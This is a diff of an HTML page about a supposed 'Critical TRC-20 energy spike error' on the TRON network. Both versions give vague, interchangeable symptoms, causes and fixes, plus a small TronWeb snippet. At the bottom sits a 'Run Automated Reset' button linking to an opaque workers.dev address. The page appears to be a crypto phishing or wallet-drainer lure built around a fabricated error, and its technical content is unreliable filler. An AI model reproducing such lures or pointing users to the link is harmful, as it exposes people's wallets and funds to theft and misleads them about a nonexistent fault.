@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Critical Trc 20 Energy Spike Error</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #1a1a24;
+        font-family: sans-serif;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #00adb5; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -41,32 +41,31 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter a "Critical TRC-20 energy spike error" when attempting to initiate transactions or interact with smart contracts on the TRON network, resulting in failed operations and potential loss of assets.</li>
+<li>Users experience a "Critical TRC-20 energy spike error" when attempting to execute smart contracts or perform transactions on the TRON network, resulting in failed transactions and significant energy consumption.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a sudden and significant increase in energy consumption by a TRC-20 token contract, exceeding the allocated energy limits and causing the contract to fail.</li>
+<li>The error occurs due to an unexpected surge in energy consumption by TRC-20 smart contracts, exceeding the allocated energy limits. This can be caused by inefficient contract code, excessive contract calls, or network congestion.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the energy limit for the specific TRC-20 token contract using the TRON Web Wallet or TronLink.</li>
-<li>Optimize contract code to reduce energy consumption and prevent future spikes.</li>
-<li>Manually adjust the contract's energy parameters using the following command:</li>
+<li>Adjust the contract's energy settings to optimize energy consumption:</li>
+<li>Increase the contract's energy limit</li>
+<li>Implement energy-efficient contract code</li>
+<li>Monitor and limit contract calls to prevent excessive energy usage</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tronweb.transactionBuilder.triggerSmartContract<span class="o">(</span>
-<span class="w">  </span><span class="s2">&quot;contract_address&quot;</span>,<span class="w"> </span>
-<span class="w">  </span><span class="s2">&quot;function_name&quot;</span>,<span class="w"> </span>
-<span class="w">  </span><span class="o">{</span><span class="s2">&quot;parameter&quot;</span>:<span class="w"> </span><span class="s2">&quot;value&quot;</span><span class="o">}</span>,<span class="w"> </span>
-<span class="w">  </span><span class="m">1000000</span>
-<span class="o">)</span>
+<div class="codehilite"><pre><span></span><code>tronweb.transactionBuilder.freezeBalance<span class="o">(</span>
+<span class="w">  </span><span class="s1">&#39;1000000&#39;</span>,<span class="w"> </span>//<span class="w"> </span>frozen_balance
+<span class="w">  </span><span class="s1">&#39;3&#39;</span><span class="w"> </span>//<span class="w"> </span>frozen_duration
+<span class="o">)</span><span class="p">;</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more complex contract adjustments.</p>
+<p>Consider utilizing an external console for more advanced troubleshooting and configuration options. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>TRON Web Wallet or TronLink installed and configured.</li>
-<li>Basic understanding of TRON smart contract interactions.</li>
-<li>Sufficient TRX funds for transaction fees.</li>
+<li>TRON wallet with sufficient funds</li>
+<li>TRONWeb or similar library for interacting with the TRON network</li>
+<li>Basic understanding of smart contract development and energy management on TRON</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
